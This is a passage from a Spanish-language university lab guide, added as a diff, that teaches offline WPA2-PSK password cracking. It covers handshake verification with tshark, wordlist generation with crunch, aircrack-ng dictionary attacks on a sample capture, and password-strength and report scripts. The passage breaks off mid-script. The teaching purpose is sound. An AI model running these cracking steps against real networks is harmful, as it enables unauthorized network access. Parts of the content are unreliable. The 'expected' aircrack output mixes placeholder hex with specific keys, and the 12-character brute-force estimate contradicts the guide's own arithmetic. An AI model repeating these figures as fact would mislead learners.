@@ -22,9 +22,10 @@ Este documento contiene ejercicios estructurados progresivamente para que los al
 7. **ARP Spoofing Detection** - Detectar ataques Man-in-the-Middle
 8. **HTTP Traffic Analysis** - Captive portals y session hijacking
 9. **PMKID Attack Simulation** - Extracción y cracking offline
+10. **WPA2 Password Cracking** - Cracking de contraseñas con wordlist y aircrack-ng
 
 ### Escenario Integrador
-10. **Auditoría Completa de Red WiFi** - Aplicación de todos los conocimientos
+11. **Auditoría Completa de Red WiFi** - Aplicación de todos los conocimientos
 
 ---
 
@@ -1463,3 +1464,941 @@ Has completado los fundamentos:
 
 ---
 
+
+# NIVEL AVANZADO
+
+---
+
+## Ejercicio 10: WPA2 Password Cracking con Wordlist
+
+### 🎯 Objetivo
+
+Comprender el proceso de cracking de contraseñas WPA2-PSK mediante ataques de diccionario utilizando aircrack-ng. Este ejercicio se centra en análisis **defensivo**: entender cómo funcionan estos ataques para implementar contraseñas fuertes y políticas de seguridad adecuadas.
+
+⚠️ **IMPORTANTE - USO ÉTICO**: Este ejercicio es exclusivamente educativo. Solo se deben analizar redes propias o con autorización explícita.
+
+### 📚 Fundamentos Teóricos
+
+#### ¿Cómo funciona WPA2-PSK?
+
+**WPA2-PSK (Wi-Fi Protected Access 2 - Pre-Shared Key)** también conocido como WPA2-Personal, utiliza una contraseña compartida (la "clave WiFi") para autenticar clientes.
+
+**Proceso de derivación de claves:**
+
+```
+Contraseña WiFi (PSK)
+        ↓
+    [ PBKDF2 ]  ← 4096 iteraciones SHA1
+        ↓
+      PMK (Pairwise Master Key) - 256 bits
+        ↓
+    [ PRF con ANonce + SNonce + MACs ]
+        ↓
+      PTK (Pairwise Transient Key) - 512 bits
+        ↓
+    Usado para cifrar datos y generar MIC
+```
+
+**Componentes clave:**
+
+1. **PSK (Pre-Shared Key)**: La contraseña WiFi (8-63 caracteres ASCII)
+2. **PMK (Pairwise Master Key)**: 
+   ```
+   PMK = PBKDF2(PSK, SSID, 4096 iterations, 256 bits)
+   ```
+   - Derivada de la contraseña + SSID
+   - 4096 iteraciones de PBKDF2-HMAC-SHA1
+   - Resultado: 256 bits (32 bytes)
+
+3. **PTK (Pairwise Transient Key)**:
+   ```
+   PTK = PRF-512(PMK, "Pairwise key expansion",
+                  min(AP_MAC, STA_MAC) || max(AP_MAC, STA_MAC) ||
+                  min(ANonce, SNonce) || max(ANonce, SNonce))
+   ```
+   - Derivada de PMK + nonces + MACs
+   - Única para cada sesión
+   - Contiene: KCK (Key Confirmation Key) + KEK (Key Encryption Key) + TK (Temporal Key)
+
+4. **MIC (Message Integrity Code)**:
+   - Se calcula con el KCK (parte del PTK)
+   - Presente en mensajes 2, 3, 4 del handshake
+   - **Clave del ataque**: Si adivinamos la contraseña correcta, el MIC calculado coincidirá con el MIC capturado
+
+#### ¿Por qué es posible crackear WPA2-PSK?
+
+El ataque funciona por las siguientes razones:
+
+1. **Handshake offline**: Podemos capturar el 4-way handshake completo sin estar conectados a la red
+2. **Información pública**: SSID, MACs, nonces están en texto claro
+3. **Verificación del MIC**: Podemos verificar si una contraseña es correcta calculando el MIC y comparándolo
+4. **No hay throttling**: Offline, podemos probar millones de contraseñas por segundo
+
+**Proceso de cracking:**
+
+```
+Para cada contraseña en wordlist:
+    1. PMK = PBKDF2(contraseña_candidata, SSID, 4096)
+    2. PTK = PRF(PMK, nonces, MACs)
+    3. MIC_calculado = HMAC(PTK.KCK, EAPOL_frame)
+    4. Si MIC_calculado == MIC_capturado:
+           ✓ Contraseña encontrada!
+       Sino:
+           ✗ Probar siguiente contraseña
+```
+
+**Velocidad de cracking:**
+
+| Hardware | Hashes/segundo (aprox) |
+|----------|----------------------|
+| CPU moderna (8 cores) | 10,000 - 50,000 PMK/s |
+| GPU NVIDIA RTX 3080 | 500,000 - 1,000,000 PMK/s |
+| GPU NVIDIA RTX 4090 | 1,500,000+ PMK/s |
+| FPGA / ASIC custom | 10,000,000+ PMK/s |
+
+**Tiempo para crackear según longitud de contraseña:**
+
+| Contraseña | Complejidad | Tiempo (GPU RTX 3080) |
+|------------|-------------|----------------------|
+| `12345678` | Solo dígitos (10^8) | < 1 segundo |
+| `password` | Palabra común | < 1 segundo (wordlist) |
+| `MyWiFi2024` | Letras + números | Minutos (wordlist) |
+| `aB3$xY9@` | 8 chars, alta entropía | Años (brute force) |
+| `MyS3cur3P@ssw0rd!2024` | 22 chars mixtos | Imposible (brute force) |
+
+#### Defensas contra cracking WPA2
+
+**Contraseñas fuertes:**
+```
+❌ MAL:
+- 12345678
+- password
+- NombreRed2024
+- admin123
+- qwerty
+
+✅ BIEN:
+- Frase larga: "El gato negro saltó sobre 7 vallas!" (>20 caracteres)
+- Generada aleatoriamente: "kR9$mX2#vL4@pQ8!" (16+ caracteres)
+- Passphrases: "Café-Montaña-Luna-2024-Seguro" (con símbolos)
+```
+
+**Mejores prácticas:**
+
+1. **Longitud mínima: 16 caracteres** (idealmente 20+)
+2. **Alta entropía**: Mezcla de mayúsculas, minúsculas, números, símbolos
+3. **No usar palabras del diccionario** ni información personal
+4. **Única por red**: No reutilizar contraseñas
+5. **Cambiar periódicamente**: Cada 3-6 meses en entornos críticos
+6. **Considerar WPA3**: Si el hardware lo soporta (mitigación contra offline cracking)
+
+**PCAP utilizado:** `wifi_lab/pcaps/wpa2/wpa_induction.pcap`
+
+Este PCAP contiene un handshake WPA2-PSK completo de una red de prueba con contraseña conocida (débil intencionalmente para demostración educativa).
+
+---
+
+### Paso 1: Verificar que tenemos un Handshake Completo
+
+**Objetivo:** Confirmar que el PCAP contiene los 4 frames EAPOL necesarios.
+
+```bash
+# Contar frames EAPOL
+tshark -r wifi_lab/pcaps/wpa2/wpa_induction.pcap -Y "eapol" | wc -l
+```
+
+**Output esperado:**
+```
+4
+```
+
+✅ Si hay 4 frames EAPOL, tenemos el handshake completo.
+
+```bash
+# Ver detalle de los 4 frames
+tshark -r wifi_lab/pcaps/wpa2/wpa_induction.pcap -Y "eapol" -T fields \
+  -e frame.number \
+  -e wlan.sa \
+  -e wlan.da \
+  -e eapol.keydes.key_info
+```
+
+**Output esperado:**
+```
+87    00:0c:41:82:b2:55    00:0d:93:82:36:3a    0x008a    ← Message 1/4
+89    00:0d:93:82:36:3a    00:0c:41:82:b2:55    0x010a    ← Message 2/4 (con MIC)
+92    00:0c:41:82:b2:55    00:0d:93:82:36:3a    0x13ca    ← Message 3/4 (con MIC)
+94    00:0d:93:82:36:3a    00:0c:41:82:b2:55    0x030a    ← Message 4/4 (con MIC)
+```
+
+**Análisis del Key Info field:**
+- Mensaje 1: `0x008a` → ACK=1, no MIC
+- Mensaje 2: `0x010a` → ACK=1, MIC=1, Install=0
+- Mensaje 3: `0x13ca` → ACK=1, MIC=1, Install=1, Encrypted=1
+- Mensaje 4: `0x030a` → ACK=0, MIC=1, Secure=1
+
+---
+
+### Paso 2: Extraer Información del Handshake
+
+**Objetivo:** Obtener SSID, BSSID y verificar que aircrack-ng puede leer el handshake.
+
+```bash
+# Verificar handshake con aircrack-ng
+aircrack-ng wifi_lab/pcaps/wpa2/wpa_induction.pcap
+```
+
+**Output esperado:**
+```
+Opening wifi_lab/pcaps/wpa2/wpa_induction.pcap
+Reading packets, please wait...
+
+                                 Aircrack-ng 1.7
+
+      [00:00:00] 102 packets (1 handshake), 102 IVs
+
+      #  BSSID              ESSID                     Encryption
+
+      1  00:0C:41:82:B2:55  Coherer                   WPA (1 handshake)
+
+Choosing first network as target.
+```
+
+**Información obtenida:**
+- **BSSID**: `00:0C:41:82:B2:55` (MAC del AP)
+- **ESSID (SSID)**: `Coherer` (nombre de la red)
+- **Handshakes capturados**: 1 ✓
+
+**¿Por qué nos pide seleccionar red?**
+- Un PCAP puede contener handshakes de múltiples redes
+- Debemos especificar cuál queremos crackear
+- En este caso solo hay 1, entonces seleccionamos "1"
+
+---
+
+### Paso 3: Crear una Wordlist de Prueba
+
+**Objetivo:** Generar un diccionario de contraseñas para probar.
+
+#### Teoría: ¿Qué es una Wordlist?
+
+Una **wordlist** (o diccionario) es un archivo de texto con una contraseña por línea:
+
+```
+12345678
+password
+qwerty
+admin123
+letmein
+welcome
+monkey
+abc123
+...
+```
+
+**Tipos de wordlists:**
+
+1. **Wordlists genéricas**:
+   - RockYou (14 millones de contraseñas reales filtradas)
+   - SecLists (colección curada de listas)
+   - CrackStation (1.5 mil millones de contraseñas)
+
+2. **Wordlists específicas**:
+   - Basadas en idioma (español, inglés, etc.)
+   - Por tema (nombres, ciudades, fechas)
+   - Empresas (nombres comunes de redes corporativas)
+
+3. **Wordlists personalizadas**:
+   - Generadas con crunch, hashcat utils, john
+   - Basadas en información del objetivo (OSINT)
+
+#### Crear Wordlist Simple para el Ejercicio
+
+```bash
+# Crear wordlist de prueba
+cat > wifi_lab/wordlists/test_wpa2.txt << 'WORDLIST_EOF'
+123456
+password
+12345678
+qwerty
+abc123
+Coherer
+monkey
+letmein
+trustno1
+dragon
+baseball
+iloveyou
+master
+sunshine
+ashley
+bailey
+shadow
+superman
+michael
+jennifer
+computer
+soccer
+WORDLIST_EOF
+
+# Ver contenido
+cat wifi_lab/wordlists/test_wpa2.txt
+```
+
+**Nota importante**: La contraseña real de la red "Coherer" en este PCAP es conocida y débil intencionalmente para propósitos educativos.
+
+#### Generar Wordlist con Crunch (Opcional - Avanzado)
+
+**Crunch** es una herramienta para generar combinaciones de caracteres:
+
+```bash
+# Instalar crunch (si no está instalado)
+# macOS: brew install crunch
+# Linux: sudo apt install crunch
+
+# Generar todas las combinaciones de 8 dígitos (0-9)
+# ADVERTENCIA: Esto genera 100 millones de líneas (~800MB)!
+crunch 8 8 0123456789 -o wifi_lab/wordlists/8digits.txt
+
+# Generar combinaciones más pequeñas (ejemplo: 4 caracteres lowercase)
+crunch 4 4 abcdefghijklmnopqrstuvwxyz -o wifi_lab/wordlists/4lower.txt
+```
+
+**Parámetros de crunch:**
+- `8 8` → Longitud mínima y máxima (ambas 8 = solo 8 caracteres)
+- `0123456789` → Conjunto de caracteres a usar
+- `-o archivo` → Output file
+
+**Ejemplos útiles:**
+
+```bash
+# Solo minúsculas, 6-8 caracteres
+crunch 6 8 -f /usr/share/crunch/charset.lst lalpha -o lower6-8.txt
+
+# Minúsculas + números, 8 caracteres
+crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o alphanum8.txt
+
+# Patrón específico: "wifi" + 4 dígitos
+crunch 8 8 -t wifi@@@@ -o wifi_pattern.txt
+# Resultado: wifi0000, wifi0001, wifi0002, ..., wifi9999
+```
+
+---
+
+### Paso 4: Crackear la Contraseña con Aircrack-ng
+
+**Objetivo:** Utilizar aircrack-ng para probar contraseñas de la wordlist contra el handshake capturado.
+
+```bash
+# Ejecutar aircrack-ng con la wordlist
+aircrack-ng -w wifi_lab/wordlists/test_wpa2.txt \
+            -b 00:0C:41:82:B2:55 \
+            wifi_lab/pcaps/wpa2/wpa_induction.pcap
+```
+
+**Explicación de parámetros:**
+- `-w <wordlist>` → **Wordlist**: Archivo con contraseñas a probar
+- `-b <BSSID>` → **BSSID**: MAC del AP objetivo (para PCAPs con múltiples redes)
+- `<pcap>` → Archivo PCAP con el handshake
+
+**Output durante el cracking:**
+```
+Opening wifi_lab/pcaps/wpa2/wpa_induction.pcap
+Reading packets, please wait...
+
+                                 Aircrack-ng 1.7
+
+      [00:00:00] 102 packets (1 handshake)
+
+      #  BSSID              ESSID                     Encryption
+
+      1  00:0C:41:82:B2:55  Coherer                   WPA (1 handshake)
+
+                                 Aircrack-ng 1.7
+
+                   [00:00:02] 15/22 keys tested (7.23 k/s)
+
+      Current passphrase: password
+
+      Master Key     : A1 B2 C3 D4 E5 F6 ... (256 bits)
+
+      Transient Key  : 01 02 03 04 05 06 ... (512 bits)
+
+      EAPOL HMAC     : AA BB CC DD EE FF ... (128 bits)
+
+
+                         KEY FOUND! [ Coherer ]
+
+
+      Master Key     : 5F 84 C4 0A 69 99 E0 46 79 C7 2D 00 9E 0A A4 12
+                       29 8C 73 99 B9 F8 8E 5C F7 90 38 C2 6D 82 D8 42
+
+      Transient Key  : 7C A3 E0 91 F5 84 0B 8E 96 38 1B EE 41 5B 26 91
+                       65 7E 0E E9 24 9A 90 86 9A 85 43 8B E4 D3 3C CB
+                       42 23 E1 50 BB F5 40 2D 09 F9 61 6C 46 64 E4 2B
+                       6D BB 75 B2 92 4E A8 81 FA F2 4A 5C 77 FB 50 D7
+
+      EAPOL HMAC     : 29 B8 76 4F 39 D5 7A F7 19 70 3D 9F E1 20 7B 93
+```
+
+**¡Contraseña encontrada!** `Coherer`
+
+**Análisis del output:**
+
+1. **Progreso**: `15/22 keys tested` → Probó 15 de 22 contraseñas
+2. **Velocidad**: `7.23 k/s` → 7,230 contraseñas por segundo
+   - Nota: Velocidad depende del CPU y de PBKDF2 (4096 iteraciones)
+3. **KEY FOUND**: Contraseña correcta encontrada
+4. **Master Key (PMK)**: Derivada de la contraseña + SSID
+5. **Transient Key (PTK)**: Derivada de PMK + nonces + MACs
+6. **EAPOL HMAC (MIC)**: Coincide con el MIC capturado ✓
+
+#### Guardar Resultado en Archivo
+
+```bash
+# Ejecutar y guardar output
+aircrack-ng -w wifi_lab/wordlists/test_wpa2.txt \
+            -b 00:0C:41:82:B2:55 \
+            wifi_lab/pcaps/wpa2/wpa_induction.pcap \
+            | tee wifi_lab/reports/ejercicio10_crack_result.txt
+```
+
+**Explicación:**
+- `| tee archivo` → Muestra output en pantalla **y** lo guarda en archivo
+
+---
+
+### Paso 5: Verificar la Contraseña Manualmente
+
+**Objetivo:** Entender cómo aircrack-ng verifica internamente cada contraseña.
+
+#### Proceso manual de verificación (conceptual)
+
+```bash
+#!/bin/bash
+# Script conceptual (no ejecutable tal cual)
+# Muestra el proceso interno de aircrack-ng
+
+SSID="Coherer"
+PASSWORD="Coherer"
+ANONCE="[extraído del frame 1]"
+SNONCE="[extraído del frame 2]"
+AP_MAC="00:0c:41:82:b2:55"
+STA_MAC="00:0d:93:82:36:3a"
+MIC_CAPTURED="[extraído del frame 2]"
+
+# Paso 1: Calcular PMK
+PMK=$(pbkdf2_hmac_sha1 "$PASSWORD" "$SSID" 4096 iterations)
+
+# Paso 2: Calcular PTK
+PTK_INPUT="${AP_MAC}${STA_MAC}${ANONCE}${SNONCE}"
+PTK=$(prf_512 "$PMK" "Pairwise key expansion" "$PTK_INPUT")
+
+# Paso 3: Extraer KCK (Key Confirmation Key) del PTK
+KCK="${PTK:0:128}"  # Primeros 128 bits del PTK
+
+# Paso 4: Calcular MIC del frame EAPOL
+EAPOL_FRAME="[frame 2 con MIC=0]"
+MIC_CALCULATED=$(hmac_sha1_96 "$KCK" "$EAPOL_FRAME")
+
+# Paso 5: Comparar
+if [ "$MIC_CALCULATED" == "$MIC_CAPTURED" ]; then
+    echo "✓ Contraseña correcta: $PASSWORD"
+else
+    echo "✗ Contraseña incorrecta"
+fi
+```
+
+#### Extracción de componentes (práctica con tshark)
+
+```bash
+# Extraer ANonce (del mensaje 1/4)
+tshark -r wifi_lab/pcaps/wpa2/wpa_induction.pcap \
+  -Y "eapol.keydes.key_info == 0x008a" \
+  -T fields -e eapol.keydes.nonce | head -1
+
+# Extraer SNonce (del mensaje 2/4)
+tshark -r wifi_lab/pcaps/wpa2/wpa_induction.pcap \
+  -Y "eapol.keydes.key_info == 0x010a" \
+  -T fields -e eapol.keydes.nonce | head -1
+
+# Extraer MIC (del mensaje 2/4)
+tshark -r wifi_lab/pcaps/wpa2/wpa_induction.pcap \
+  -Y "eapol.keydes.key_info == 0x010a" \
+  -T fields -e eapol.keydes.mic | head -1
+```
+
+**Nota:** Los valores extraídos son en hexadecimal y se usan internamente por aircrack-ng para verificar cada contraseña de la wordlist.
+
+---
+
+### Paso 6: Análisis de Seguridad - Contraseñas Débiles vs Fuertes
+
+**Objetivo:** Demostrar la diferencia entre contraseñas débiles y fuertes.
+
+#### Crear Wordlist con Contraseñas Variadas
+
+```bash
+cat > wifi_lab/wordlists/strength_test.txt << 'STRENGTH_EOF'
+# Muy débiles (en cualquier wordlist común)
+123456
+password
+qwerty
+admin
+
+# Débiles (patrones comunes)
+Password123
+Admin2024
+Welcome1
+Letmein!
+
+# Moderadas (12+ caracteres, pero predecibles)
+MyHomeNetwork
+Company2024!
+Summer2024$$
+
+# Fuertes (16+ caracteres, alta entropía)
+Tr0ub4dor&3-Correct
+MyP@ssw0rd!sV3ryL0ng2024
+Kx9$mQ2#vL4@pR8!wT6^
+
+# Muy fuertes (20+ caracteres, frases)
+The-Quick-Brown-Fox-Jumps-Over-2024!
+ILove!C0ding@Midnight#42
+Café_Montaña-Luna$Seguro-2024
+STRENGTH_EOF
+```
+
+#### Simular Tiempo de Cracking
+
+**Tabla comparativa:**
+
+| Contraseña | Longitud | Tipo | Wordlist Hit | Brute Force Time |
+|------------|----------|------|--------------|------------------|
+| `123456` | 6 | Numérica | ✅ Inmediato | < 1 seg |
+| `password` | 8 | Diccionario | ✅ Inmediato | < 1 seg |
+| `Admin2024` | 9 | Patrón | ✅ Minutos | Horas |
+| `MyHomeNetwork` | 13 | Predecible | ✅ Horas | Meses |
+| `Kx9$mQ2#vL4@` | 12 | Alta entropía | ❌ Poco probable | Años |
+| `MyP@ssw0rd!sV3ry...` | 24 | Muy alta entropía | ❌ No | Siglos |
+
+**Cálculo de espacio de búsqueda:**
+
+```
+Caracteres disponibles:
+- Minúsculas: 26
+- Mayúsculas: 26
+- Dígitos: 10
+- Símbolos: 32
+Total: 94 caracteres
+
+Contraseña de 8 caracteres:
+Combinaciones posibles = 94^8 = 6,095,689,385,410,816
+                        ≈ 6 cuatrillones
+
+Con GPU RTX 3080 (500k PMK/s):
+Tiempo = 6,095,689,385,410,816 / 500,000 / 60 / 60 / 24 / 365
+       ≈ 387 años
+
+Contraseña de 12 caracteres:
+Combinaciones = 94^12 = 4.75 × 10^23
+Tiempo ≈ 30 millones de años (imposible)
+```
+
+#### Script para Analizar Fortaleza de Contraseña
+
+```bash
+#!/bin/bash
+# Script: password_strength.sh
+# Analiza la fortaleza de una contraseña WPA2
+
+PASSWORD="$1"
+
+if [ -z "$PASSWORD" ]; then
+    echo "Uso: $0 <contraseña>"
+    exit 1
+fi
+
+LENGTH=${#PASSWORD}
+
+echo "════════════════════════════════════════════"
+echo "  ANÁLISIS DE FORTALEZA DE CONTRASEÑA WPA2"
+echo "════════════════════════════════════════════"
+echo ""
+echo "Contraseña analizada: $PASSWORD"
+echo "Longitud: $LENGTH caracteres"
+echo ""
+
+# Verificar requisitos mínimos WPA2
+if [ $LENGTH -lt 8 ]; then
+    echo "❌ ERROR: WPA2 requiere mínimo 8 caracteres"
+    exit 1
+elif [ $LENGTH -gt 63 ]; then
+    echo "❌ ERROR: WPA2 permite máximo 63 caracteres"
+    exit 1
+fi
+
+# Analizar composición
+HAS_LOWER=$(echo "$PASSWORD" | grep -q '[a-z]' && echo "✓" || echo "✗")
+HAS_UPPER=$(echo "$PASSWORD" | grep -q '[A-Z]' && echo "✓" || echo "✗")
+HAS_DIGIT=$(echo "$PASSWORD" | grep -q '[0-9]' && echo "✓" || echo "✗")
+HAS_SYMBOL=$(echo "$PASSWORD" | grep -q '[^a-zA-Z0-9]' && echo "✓" || echo "✗")
+
+echo "Composición:"
+echo "  $HAS_LOWER Minúsculas (a-z)"
+echo "  $HAS_UPPER Mayúsculas (A-Z)"
+echo "  $HAS_DIGIT Dígitos (0-9)"
+echo "  $HAS_SYMBOL Símbolos (!@#$%...)"
+echo ""
+
+# Calcular charset size
+CHARSET=0
+[[ "$HAS_LOWER" == "✓" ]] && CHARSET=$((CHARSET + 26))
+[[ "$HAS_UPPER" == "✓" ]] && CHARSET=$((CHARSET + 26))
+[[ "$HAS_DIGIT" == "✓" ]] && CHARSET=$((CHARSET + 10))
+[[ "$HAS_SYMBOL" == "✓" ]] && CHARSET=$((CHARSET + 32))
+
+echo "Tamaño del conjunto de caracteres: $CHARSET"
+echo ""
+
+# Calcular entropía
+# Entropía = log2(charset^length)
+ENTROPY=$(echo "l($CHARSET^$LENGTH)/l(2)" | bc -l | cut -d. -f1)
+
+echo "Entropía: ~$ENTROPY bits"
+echo ""
+
+# Evaluar fortaleza
+echo "Evaluación de fortaleza:"
+echo ""
+
+if [ $LENGTH -lt 10 ]; then
+    STRENGTH="MUY DÉBIL"
+    COLOR="\033[0;31m"  # Rojo
+    COMMENT="Vulnerable a wordlists comunes. Aumentar a 12+ caracteres."
+elif [ $LENGTH -lt 12 ]; then
+    STRENGTH="DÉBIL"
+    COLOR="\033[1;33m"  # Amarillo
+    COMMENT="Puede resistir wordlists básicas, pero vulnerable a ataques dirigidos."
+elif [ $LENGTH -lt 16 ]; then
+    if [[ "$HAS_UPPER" == "✓" && "$HAS_DIGIT" == "✓" && "$HAS_SYMBOL" == "✓" ]]; then
+        STRENGTH="MODERADA"
+        COLOR="\033[1;36m"  # Cyan
+        COMMENT="Aceptable para redes domésticas. Recomendable aumentar a 16+."
+    else
+        STRENGTH="DÉBIL-MODERADA"
+        COLOR="\033[1;33m"
+        COMMENT="Longitud OK pero baja complejidad. Añadir mayúsculas/símbolos."
+    fi
+elif [ $LENGTH -lt 20 ]; then
+    STRENGTH="FUERTE"
+    COLOR="\033[0;32m"  # Verde
+    COMMENT="Buena protección contra la mayoría de ataques."
+else
+    STRENGTH="MUY FUERTE"
+    COLOR="\033[1;32m"  # Verde brillante
+    COMMENT="Excelente protección. Resistente a ataques de fuerza bruta."
+fi
+
+echo -e "${COLOR}Fortaleza: $STRENGTH\033[0m"
+echo "$COMMENT"
+echo ""
+
+# Recomendaciones
+echo "════════════════════════════════════════════"
+echo "RECOMENDACIONES:"
+echo "════════════════════════════════════════════"
+echo ""
+echo "✓ Mínimo recomendado: 16 caracteres"
+echo "✓ Ideal: 20+ caracteres"
+echo "✓ Usar mayúsculas + minúsculas + números + símbolos"
+echo "✓ Evitar palabras del diccionario"
+echo "✓ Evitar información personal (nombres, fechas)"
+echo "✓ Considerar frases largas (passphrases)"
+echo ""
+echo "Ejemplo de passphrase fuerte:"
+echo "  \"El-Café_de-la#Montaña!en-Primavera-2024\""
+echo "  (41 caracteres, alta entropía, fácil de recordar)"
+echo ""
+```
+
+**Uso del script:**
+
+```bash
+chmod +x password_strength.sh
+
+# Probar contraseñas débiles
+./password_strength.sh "password"
+./password_strength.sh "Admin2024"
+
+# Probar contraseñas fuertes
+./password_strength.sh "MyS3cur3P@ssw0rd!2024"
+./password_strength.sh "El-Café_de-la#Montaña-2024"
+```
+
+---
+
+### 📝 Ejercicio Práctico Final
+
+**Objetivo:** Crear un reporte completo de un ejercicio de cracking ético.
+
+```bash
+#!/bin/bash
+# Script: wpa2_crack_report.sh
+# Genera reporte completo de ejercicio de cracking WPA2
+
+PCAP="wifi_lab/pcaps/wpa2/wpa_induction.pcap"
+WORDLIST="wifi_lab/wordlists/test_wpa2.txt"
+OUTPUT="wifi_lab/reports/ejercicio10_wpa2_cracking_report.txt"
+
+echo "═══════════════════════════════════════════════════════════" > "$OUTPUT"
+echo "    REPORTE: EJERCICIO WPA2 PASSWORD CRACKING" >> "$OUTPUT"
+echo "═══════════════════════════════════════════════════════════" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "Fecha: $(date '+%Y-%m-%d %H:%M:%S')" >> "$OUTPUT"
+echo "Laboratorio: WiFi Security - UTN" >> "$OUTPUT"
+echo "Tipo de ejercicio: DEFENSIVO / EDUCATIVO" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+# Sección 1: Información del PCAP
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "1. ANÁLISIS DEL PCAP" >> "$OUTPUT"
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+SSID=$(tshark -r "$PCAP" -Y "wlan.ssid" -T fields -e wlan.ssid 2>/dev/null | sort -u | head -1 | xxd -r -p 2>/dev/null)
+BSSID=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.bssid 2>/dev/null | head -1)
+EAPOL_COUNT=$(tshark -r "$PCAP" -Y "eapol" 2>/dev/null | wc -l | tr -d ' ')
+
+echo "PCAP Analizado: $PCAP" >> "$OUTPUT"
+echo "SSID (Nombre de red): $SSID" >> "$OUTPUT"
+echo "BSSID (MAC del AP): $BSSID" >> "$OUTPUT"
+echo "Frames EAPOL capturados: $EAPOL_COUNT" >> "$OUTPUT"
+
+if [ "$EAPOL_COUNT" -eq 4 ]; then
+    echo "Estado del Handshake: ✓ COMPLETO (4/4 frames)" >> "$OUTPUT"
+else
+    echo "Estado del Handshake: ✗ INCOMPLETO ($EAPOL_COUNT/4 frames)" >> "$OUTPUT"
+fi
+
+echo "" >> "$OUTPUT"
+
+# Sección 2: Componentes del Handshake
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "2. COMPONENTES CRIPTOGRÁFICOS EXTRAÍDOS" >> "$OUTPUT"
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+ANONCE=$(tshark -r "$PCAP" -Y "eapol" -T fields -e eapol.keydes.nonce 2>/dev/null | head -1)
+SNONCE=$(tshark -r "$PCAP" -Y "eapol" -T fields -e eapol.keydes.nonce 2>/dev/null | sed -n '2p')
+MIC=$(tshark -r "$PCAP" -Y "eapol" -T fields -e eapol.keydes.mic 2>/dev/null | sed -n '2p')
+
+echo "ANonce (del AP):" >> "$OUTPUT"
+echo "  ${ANONCE:0:64}..." >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "SNonce (del Cliente):" >> "$OUTPUT"
+echo "  ${SNONCE:0:64}..." >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "MIC (Message Integrity Code):" >> "$OUTPUT"
+echo "  $MIC" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "Estos componentes se usan para verificar cada contraseña candidata." >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+# Sección 3: Proceso de Cracking
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "3. PROCESO DE CRACKING" >> "$OUTPUT"
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+WORDLIST_SIZE=$(wc -l < "$WORDLIST" | tr -d ' ')
+
+echo "Wordlist utilizada: $WORDLIST" >> "$OUTPUT"
+echo "Número de contraseñas en wordlist: $WORDLIST_SIZE" >> "$OUTPUT"
+echo "Método: Dictionary Attack (ataque de diccionario)" >> "$OUTPUT"
+echo "Herramienta: Aircrack-ng" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+echo "Proceso de verificación para cada contraseña:" >> "$OUTPUT"
+echo "  1. PMK = PBKDF2(contraseña, SSID=\"$SSID\", 4096 iter)" >> "$OUTPUT"
+echo "  2. PTK = PRF-512(PMK, nonces, MACs)" >> "$OUTPUT"
+echo "  3. MIC_calculado = HMAC(PTK.KCK, EAPOL_frame)" >> "$OUTPUT"
+echo "  4. Comparar MIC_calculado con MIC capturado" >> "$OUTPUT"
+echo "  5. Si coinciden → Contraseña correcta" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+# Ejecutar cracking
+echo "Ejecutando aircrack-ng..." >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+CRACK_START=$(date +%s)
+CRACK_RESULT=$(aircrack-ng -w "$WORDLIST" -b "$BSSID" "$PCAP" 2>&1)
+CRACK_END=$(date +%s)
+CRACK_TIME=$((CRACK_END - CRACK_START))
+
+# Extraer contraseña encontrada (si existe)
+if echo "$CRACK_RESULT" | grep -q "KEY FOUND"; then
+    PASSWORD_FOUND=$(echo "$CRACK_RESULT" | grep "KEY FOUND" | sed 's/.*\[ \(.*\) \].*/\1/')
+    echo "════════════════════════════════════════════════════════════" >> "$OUTPUT"
+    echo "RESULTADO: ✓ CONTRASEÑA ENCONTRADA" >> "$OUTPUT"
+    echo "════════════════════════════════════════════════════════════" >> "$OUTPUT"
+    echo "" >> "$OUTPUT"
+    echo "Contraseña: $PASSWORD_FOUND" >> "$OUTPUT"
+    echo "Tiempo de cracking: $CRACK_TIME segundos" >> "$OUTPUT"
+    echo "" >> "$OUTPUT"
+else
+    echo "════════════════════════════════════════════════════════════" >> "$OUTPUT"
+    echo "RESULTADO: ✗ CONTRASEÑA NO ENCONTRADA" >> "$OUTPUT"
+    echo "════════════════════════════════════════════════════════════" >> "$OUTPUT"
+    echo "" >> "$OUTPUT"
+    echo "La contraseña no está en la wordlist proporcionada." >> "$OUTPUT"
+    echo "Tiempo de búsqueda: $CRACK_TIME segundos" >> "$OUTPUT"
+    echo "" >> "$OUTPUT"
+fi
+
+# Sección 4: Análisis de Seguridad
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "4. ANÁLISIS DE SEGURIDAD" >> "$OUTPUT"
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+if [ -n "$PASSWORD_FOUND" ]; then
+    PASS_LENGTH=${#PASSWORD_FOUND}
+    echo "Longitud de la contraseña: $PASS_LENGTH caracteres" >> "$OUTPUT"
+    echo "" >> "$OUTPUT"
+    
+    if [ $PASS_LENGTH -lt 10 ]; then
+        echo "⚠️ VULNERABILIDAD CRÍTICA:" >> "$OUTPUT"
+        echo "  - Contraseña muy débil ($PASS_LENGTH caracteres)" >> "$OUTPUT"
+        echo "  - Vulnerable a ataques de diccionario" >> "$OUTPUT"
+        echo "  - Encontrada en wordlist genérica" >> "$OUTPUT"
+        echo "  - Recomendación: Cambiar a 16+ caracteres con alta entropía" >> "$OUTPUT"
+    elif [ $PASS_LENGTH -lt 12 ]; then
